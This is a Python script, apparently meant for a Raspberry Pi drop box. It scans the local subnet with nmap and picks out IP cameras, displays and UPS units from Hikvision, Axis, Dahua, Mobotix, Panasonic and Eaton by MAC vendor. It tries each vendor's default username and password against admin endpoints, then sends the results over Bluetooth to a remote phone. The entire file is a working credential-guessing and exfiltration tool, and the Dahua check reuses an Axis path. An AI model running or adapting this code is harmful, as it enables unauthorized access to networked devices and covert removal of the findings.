import nmap
import requests
from requests.auth import HTTPBasicAuth
from requests.auth import HTTPDigestAuth
import socket
import sys
import subprocess


# define function get_ip_address
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


# define function network_scan
def network_scan():
    # save print output to text file
    with open('/tmp/output.txt', "w") as sys.stdout:
        # assign interface_ip to get_ip_address return value
        interface_ip = get_ip_address()
        # Convert networkIP to 0/24 subnet ip range
        network_cidr = interface_ip[:interface_ip.rfind('.') + 1] + '0/24'
        # tcp ports to scan for found vendor device
        port_list = '21,22,23,80,81,8080'

        nm = nmap.PortScanner()
        # scan network with specified network_cidr and port_list
        nm.scan(network_cidr, port_list, arguments='-sS', sudo=True)

        for host in nm.all_hosts():
            if 'mac' in nm[host]['addresses']:
                vendor = str(nm[host]['vendor'])[23:][:-2]
                global ip
                ip = str(nm[host]['addresses'])[10:-30]
                vendor_list = ['Mobotix AG', 'Hangzhou Hikvision Digital Technology', 'Axis Communications AB',
                               'Zhejiang Dahua Technology', 'Panasonic Communications Co', 'Eaton']
                # for each vendor in vendor_list print name, ip, open ports and do http_request
                for vendor_string in vendor_list:
                    if vendor_string in vendor:
                        print('----------------------------------------')
                        # print vendor name
                        print(vendor)
                        # print ip address
                        print(ip)
                        # print only open ports
                        for proto in nm[host].all_protocols():
                            ports = nm[host][proto].keys()
                            for port in ports:
                                port_state = nm[host][proto][port]["state"]
                                # only print result for open ports
                                if 'open' in port_state:
                                    print(f'port: {port}\tstate: {port_state}')

                        # call http_request function if device vendor name contains target vendor
                        if 'Mobotix AG' in vendor_string:
                            # Mobotix: Default - admin/meinsm
                            http_request('admin', 'meinsm', '/control/userimage.html')

                        if 'Hangzhou Hikvision Digital Technology' in vendor_string:
                            # Hikvision: Firmware 5.3.0 and up requires unique password creation; previously admin/12345
                            http_request('admin', '12345', '/ISAPI/System/status')

                        if 'Axis Communications AB' in vendor_string:
                            # Axis: Traditionally root/pass, new Axis cameras require password creation during first login
                            http_request('root', 'pass',
                                         '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')

                        if 'Zhejiang Dahua Technology' in vendor_string:
                            # Dahua: Requires password creation on first login, older models default to admin/admin
                            http_request('admin', 'admin',
                                         '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')

                        if 'Panasonic Communications Co' in vendor_string:
                            # Panasonic TV default user: dispadmin/@Panasonic
                            http_request('dispadmin', '@Panasonic', '/cgi-bin/main.cgi')

                        if 'Eaton' in vendor_string:
                            # Eaton UPS default user: admin/admin
                            http_request('admin', 'admin', '/set_net.htm')

        print('Scanning finished.')


# define http request function
def http_request(default_login, default_pw, url_location):
    auth_methods = [HTTPBasicAuth, HTTPDigestAuth]
    # try Basic and Digest auth methods, if auth success then print auth_method success
    for auth_method in auth_methods:
        try:
            response = requests.get(f'http://{ip}{url_location}',
                                    auth=auth_method(default_login, default_pw),
                                    verify=False, timeout=2.0)

            if response.ok:
                print(f'{str(auth_method)[22:][:-2]} success')
                break
        except requests.exceptions.RequestException as e:
            pass


# call function network_scan
network_scan()

# send scan results output file from RPi to remote Android device via Bluetooth
# https://stackoverflow.com/questions/8556777/dbus-php-unable-to-launch-dbus-daemon-without-display-for-x11?rq=1
# A8:7D:12:51:91:37
res = subprocess.Popen('eval \'dbus-launch --auto-syntax\' bt-obex -p MAC_ADDRESS /tmp/output.txt', shell=True,
                       stdout=subprocess.PIPE)
# Wait for the process end and print error in case of failure
if res.wait() != 0:
    output, error = res.communicate()
    print(error)
